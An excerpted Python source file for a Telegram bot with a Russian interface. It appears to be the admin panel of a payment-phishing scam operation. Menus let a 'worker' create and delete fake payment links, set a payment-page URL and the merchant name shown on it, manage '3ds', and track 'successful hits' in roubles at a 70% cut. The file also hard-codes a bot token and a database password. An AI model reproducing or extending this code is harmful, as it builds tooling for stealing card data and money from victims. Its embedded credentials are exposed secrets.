...
TOKEN = '1881156392:AAGoYyyxS9sAcgilbj6sS8nvgco5ODuLPnI' #API тестовый
adminList = [1038162734]; # Админы

# База данных
mydb = mysql.connector.connect(
  host="tgbot.beget.tech",
  user="tgbot_name",
  password="Den4ik1488",
  database="tgbot_name"
)
...
try:    
    ...
    val = ("tgbot.beget.tech", "tgbot.beget.tech", TOKEN);
...
def adminMainMenu(cid, txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
    markup.row(types.KeyboardButton('Управление 3ds'))
    markup.row(types.KeyboardButton('👁️Мой профиль'), types.KeyboardButton('Список моих объявлений'))
    markup.row(types.KeyboardButton('🔗Создать ссылку'),types.KeyboardButton('🗑️Удалить ссылку'))
    markup.row(types.KeyboardButton('⚙️Настройки'))
...
def adminSettingsMenu(cid,txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
    markup.row(types.KeyboardButton('Url платежки'),types.KeyboardButton('Организация на странице оплаты'))
    markup.row(types.KeyboardButton('Назад'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
    hideBoard = types.ReplyKeyboardRemove()
...
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if stepFlag==10 or stepFlag==0 or stepFlag==31 or stepFlag == 20 or stepFlag == 30 or stepFlag == 25 or stepFlag == 11 or stepFlag == 12 or stepFlag == 14 or stepFlag == 15 or stepFlag == 16 or stepFlag == 17:
        adminMainMenu(cid,"Главное меню")
        stepFlag = 0
...
@bot.message_handler(func=lambda message: message.text == '👁️Мой профиль')
def command_rules(m):
    global stepFlag
    global method
    cid = m.chat.id
    if cid in adminList:
        adminMainMenu(cid,"😉Ваш профиль:\n\nID: " + str(cid) + 
        "\nСтавка: 70%\nУспешных залетов: null на сумму null RUB\n\nСтатус: 'Воркер'\nВ команде: null дней") 
        stepFlag = 10
        method = 0;
...
def command_rules(m):
    ...
    cid = m.chat.id
    if cid in adminList:
        backButton(cid,"Стоимость товара:")
        stepFlag = 15
        method = 1;
...
@bot.message_handler(func=lambda message: message.text == 'Список моих объявлений')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        try:
            ...
            i = 0
            for x in myresult:
                bot.send_message(cid, "ID - " + str(myresult[i][0])+ " | Сумма: " + str(myresult[i][3]) + " | Метод - (Покупка) - " + str(myresult[i][2]) + "\nСсылка: " + str(myresult[i][1]), parse_mode= "Markdown")
                i=i+1         
        except Exception as e:
            bot.send_message(cid, e, parse_mode= "Markdown")

@bot.message_handler(func=lambda message: message.text == '🗑️Удалить ссылку')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
...
@bot.message_handler(func=lambda message: message.text == 'Управление 3ds')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
